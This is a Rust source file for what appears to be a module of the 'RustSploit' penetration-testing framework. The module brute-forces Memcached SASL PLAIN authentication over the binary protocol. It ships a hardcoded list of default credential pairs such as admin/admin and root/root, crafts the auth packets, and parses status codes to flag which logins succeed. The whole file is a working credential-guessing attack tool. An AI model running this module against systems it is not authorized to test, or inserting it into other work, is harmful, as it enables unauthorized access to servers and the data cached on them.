//! Memcached SASL PLAIN authentication probe over the binary protocol.

use anyhow::{Context, Result};
use crate::module::{ModuleCtx, ModuleOutcome};
use std::time::Duration;

use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::creds_helper::{self, CredsRun};
use crate::utils::LoginResult;

const DEFAULT_PORT: u16 = 11211;

const DEFAULTS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("admin", "password"),
    ("memcached", "memcached"),
    ("root", "root"),
    ("user", "password"),
];

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "Memcached SASL Bruteforce".to_string(),
        description:
            "Probes Memcached SASL PLAIN auth via the binary protocol (cmd 0x21). \
             Single-target — scheduler does fan-out."
                .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://github.com/memcached/memcached/wiki/SASLAuthProtocol".to_string(),
        ],
        disclosure_date: None,
        rank: ModuleRank::Normal,
        default_port: Some(11211),
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx.target.as_single().context("memcached_bruteforce requires a single-host target")?;
    creds_helper::run(
        target,
        CredsRun {
            service_name: "memcached",
            default_port: DEFAULT_PORT,
            source_module: "creds/generic/memcached_bruteforce",
            defaults: DEFAULTS,
            password_only: false,
        },
        |host, port, user, pass, timeout| async move { probe(&host, port, &user, &pass, timeout).await },
    )
    .await
}

async fn probe(host: &str, port: u16, user: &str, pass: &str, timeout: Duration) -> LoginResult {
    use tokio::io::AsyncWriteExt;

    let addr = format!("{}:{}", host, port);
    let mut stream = match crate::utils::creds_helper::connect_with_timeout(&addr, timeout).await {
        Ok(s) => s,
        Err(e) => {
            return LoginResult::Error {
                message: format!("connect: {e}"),
                retryable: true,
            }
        }
    };

    // Binary protocol header: magic(0x80) + opcode(0x21=SASL Auth)
    // + key_len(u16) + extras_len(0) + data_type(0) + reserved(0)
    // + total_body(u32) + opaque(u32) + cas(u64).
    // Body: "PLAIN" (key) + "\0user\0pass" (value).
    let mech = b"PLAIN";
    let mut value = Vec::with_capacity(2 + user.len() + pass.len());
    value.push(0);
    value.extend_from_slice(user.as_bytes());
    value.push(0);
    value.extend_from_slice(pass.as_bytes());

    let key_len = mech.len() as u16;
    let total_body = mech.len() as u32 + value.len() as u32;

    let mut packet = Vec::with_capacity(24 + mech.len() + value.len());
    packet.push(0x80); // request magic
    packet.push(0x21); // SASL Auth
    packet.extend_from_slice(&key_len.to_be_bytes());
    packet.push(0); // extras len
    packet.push(0); // data type
    packet.extend_from_slice(&0u16.to_be_bytes()); // reserved
    packet.extend_from_slice(&total_body.to_be_bytes());
    packet.extend_from_slice(&0u32.to_be_bytes()); // opaque
    packet.extend_from_slice(&0u64.to_be_bytes()); // cas
    packet.extend_from_slice(mech);
    packet.extend_from_slice(&value);

    if let Err(e) = stream.write_all(&packet).await {
        return LoginResult::Error {
            message: format!("write: {e}"),
            retryable: true,
        };
    }

    // Read 24-byte response header.
    let mut header = [0u8; 24];
    if let Err(e) = crate::utils::creds_helper::read_exact_with_timeout(
        &mut stream,
        &mut header,
        timeout,
    )
    .await
    {
        return LoginResult::Error {
            message: format!("read: {e}"),
            retryable: true,
        };
    }

    // Confirm this is a RESPONSE (magic 0x81) to our SASL-Auth (opcode 0x21)
    // before trusting the status field — otherwise an unrelated/error frame whose
    // status bytes happen to be 0x0000 would be read as a successful login.
    if header[0] != 0x81 || header[1] != 0x21 {
        return LoginResult::Error {
            message: format!("unexpected memcached frame magic=0x{:02x} opcode=0x{:02x}", header[0], header[1]),
            retryable: false,
        };
    }

    // status @ bytes 6..8.
    let status = u16::from_be_bytes([header[6], header[7]]);
    match status {
        0x0000 => LoginResult::Success,
        0x0020 | 0x0021 => LoginResult::AuthFailed, // auth error / further auth step required
        0x0008 => LoginResult::Error {
            // 0x0008 is "out of memory" — a transient server condition, not a
            // credential rejection; retry rather than recording a clean failure.
            message: "memcached out of memory".to_string(),
            retryable: true,
        },
        other => LoginResult::Error {
            message: format!("unexpected status 0x{other:04x}"),
            retryable: false,
        },
    }
}

crate::register_native_module!(crate::module::Category::Creds, "generic/memcached_bruteforce", native);
